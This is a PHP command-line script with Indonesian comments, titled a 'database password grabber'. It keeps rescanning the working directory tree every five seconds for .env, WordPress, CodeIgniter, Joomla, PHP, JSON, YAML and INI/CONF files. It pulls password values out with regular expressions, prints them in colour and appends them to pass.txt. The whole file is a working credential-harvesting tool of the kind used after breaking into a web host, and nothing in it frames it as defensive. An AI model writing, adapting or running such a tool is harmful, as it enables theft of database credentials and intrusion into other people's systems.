#!/usr/bin/php
<?php
// Simpan sebagai: db_grab.php
// Jalankan: php db_grab.php
// Tools ini akan jalan terus dan nyimpen password doang dari konfigurasi database

// Set waktu Indonesia
date_default_timezone_set('Asia/Jakarta');

// File output utama - HANYA PASSWORD
$output_file = "pass.txt";

// Banner
echo "\033[36m";
echo "╔══════════════════════════════════════════════════════════╗\n";
echo "║ DATABASE PASSWORD GRABBER - REAL TIME                   ║\n";
echo "║ Jalan Terus - Nyimpen Password Doang                    ║\n";
echo "╚══════════════════════════════════════════════════════════╝\n";
echo "\033[0m\n";
echo "\033[33mMulai: ".date('Y-m-d H:i:s')."\033[0m\n";
echo "\033[32mOutput file: $output_file (HANYA PASSWORD)\033[0m\n";
echo "\033[33mTools akan jalan terus, Ctrl+C untuk stop\033[0m\n";
echo str_repeat("=", 60)."\n";

// Buat file header - sederhana aja
$header = "=== DATABASE PASSWORDS - ".date('Y-m-d H:i:s')." ===\n";
file_put_contents($output_file, $header, FILE_APPEND);

$sudah_ditemukan = [];

// Loop forever
while(true) {
    $start_dir = getcwd();
    $waktu = date('Y-m-d H:i:s');
    $ditemukan_baru = false;
    
    // 1. Scan file .env
    $files = shell_exec("find $start_dir -name '.env' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            
            // Cari password di .env
            foreach(explode("\n", $content) as $line) {
                if(preg_match('/^(DB_PASSWORD|DATABASE_PASSWORD|DB_PASS|PASSWORD)/i', trim($line)) && strpos($line, '#') !== 0) {
                    if(preg_match('/[\'"]([^\'"]+)[\'"]$/', trim($line), $match) || 
                       preg_match('/=(.+)$/', trim($line), $match)) {
                        $password = trim($match[1], "'\"");
                        if(!empty($password) && strlen($password) > 2) {
                            file_put_contents($output_file, $password."\n", FILE_APPEND);
                            echo "\033[32m[PASSWORD ENV] $password\033[0m\n";
                            $ditemukan_baru = true;
                        }
                    }
                }
            }
        }
    }
    
    // 2. Scan wp-config.php
    $files = shell_exec("find $start_dir -name 'wp-config.php' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            preg_match('/define\([\'"]?DB_PASSWORD[\'"]?,\s*[\'"]([^\'"]+)[\'"]\)/', $content, $match);
            if(!empty($match[1])) {
                file_put_contents($output_file, $match[1]."\n", FILE_APPEND);
                echo "\033[32m[PASSWORD WORDPRESS] $match[1]\033[0m\n";
                $ditemukan_baru = true;
            }
        }
    }
    
    // 3. Scan database.php (CodeIgniter)
    $files = shell_exec("find $start_dir -name 'database.php' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            preg_match('/[\'"]?password[\'"]?\s*=>\s*[\'"]([^\'"]+)[\'"]/', $content, $match);
            if(!empty($match[1])) {
                file_put_contents($output_file, $match[1]."\n", FILE_APPEND);
                echo "\033[32m[PASSWORD CODEIGNITER] $match[1]\033[0m\n";
                $ditemukan_baru = true;
            }
        }
    }
    
    // 4. Scan configuration.php (Joomla)
    $files = shell_exec("find $start_dir -name 'configuration.php' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            preg_match('/public\s+\$password\s*=\s*[\'"]([^\'"]+)[\'"]/', $content, $match);
            if(!empty($match[1])) {
                file_put_contents($output_file, $match[1]."\n", FILE_APPEND);
                echo "\033[32m[PASSWORD JOOMLA] $match[1]\033[0m\n";
                $ditemukan_baru = true;
            }
        }
    }
    
    // 5. Scan semua file PHP untuk cari password
    $files = shell_exec("find $start_dir -name '*.php' -type f 2>/dev/null | xargs grep -l -E '(password|pass|pwd).*=' 2>/dev/null | head -50");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            $lines = explode("\n", $content);
            foreach($lines as $line) {
                if(preg_match('/(password|pass|pwd)\s*=>\s*[\'"]([^\'"]+)[\'"]/i', $line, $match) || 
                   preg_match('/(password|pass|pwd)\s*=\s*[\'"]([^\'"]+)[\'"]/i', $line, $match) || 
                   preg_match('/(password|pass|pwd)\s*:\s*[\'"]([^\'"]+)[\'"]/i', $line, $match)) {
                    if(!empty($match[2]) && strlen($match[2]) > 2) {
                        file_put_contents($output_file, $match[2]."\n", FILE_APPEND);
                        echo "\033[35m[PASSWORD PHP] $match[2]\033[0m\n";
                        $ditemukan_baru = true;
                    }
                }
            }
        }
    }
    
    // 6. Scan file JSON
    $files = shell_exec("find $start_dir -name '*.json' -type f 2>/dev/null | xargs grep -l '\"password\"' 2>/dev/null | head -20");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            preg_match_all('/"password"\s*:\s*"([^"]+)"/', $content, $matches);
            foreach($matches[1] as $password) {
                if(!empty($password) && strlen($password) > 2) {
                    file_put_contents($output_file, $password."\n", FILE_APPEND);
                    echo "\033[36m[PASSWORD JSON] $password\033[0m\n";
                    $ditemukan_baru = true;
                }
            }
        }
    }
    
    // 7. Scan file YAML
    $files = shell_exec("find $start_dir -name '*.yml' -o -name '*.yaml' -type f 2>/dev/null | xargs grep -l 'password:' 2>/dev/null | head -20");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            preg_match_all('/password:\s*[\'"]?([^\'"\s]+)/', $content, $matches);
            foreach($matches[1] as $password) {
                if(!empty($password) && strlen($password) > 2) {
                    file_put_contents($output_file, $password."\n", FILE_APPEND);
                    echo "\033[33m[PASSWORD YAML] $password\033[0m\n";
                    $ditemukan_baru = true;
                }
            }
        }
    }
    
    // 8. Scan file INI/CONF
    $files = shell_exec("find $start_dir -name '*.ini' -o -name '*.conf' -o -name '*.cnf' -type f 2>/dev/null | xargs grep -l -E '(password|pass)' 2>/dev/null | head -20");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $content = file_get_contents($file);
            $lines = explode("\n", $content);
            foreach($lines as $line) {
                if(preg_match('/(password|pass)\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?$/i', trim($line), $match)) {
                    if(!empty($match[2]) && strpos($match[2], ';') !== 0) {
                        $password = trim($match[2], "'\"");
                        if(strlen($password) > 2) {
                            file_put_contents($output_file, $password."\n", FILE_APPEND);
                            echo "\033[34m[PASSWORD INI] $password\033[0m\n";
                            $ditemukan_baru = true;
                        }
                    }
                }
            }
        }
    }
    
    // Tampilkan status setiap 30 detik kalau gak ada yang baru
    if(!$ditemukan_baru) {
        echo "\033[90m[".date('H:i:s')."] Monitoring... (Nunggu password baru)\033[0m\n";
    }
    
    // Simpan daftar yang udah ditemukan biar gak kebanyakan
    if(count($sudah_ditemukan) > 1000) {
        $sudah_ditemukan = array_slice($sudah_ditemukan, -500);
    }
    
    // Delay 5 detik sebelum scan ulang (lebih cepet dikit)
    sleep(5);
}
?>
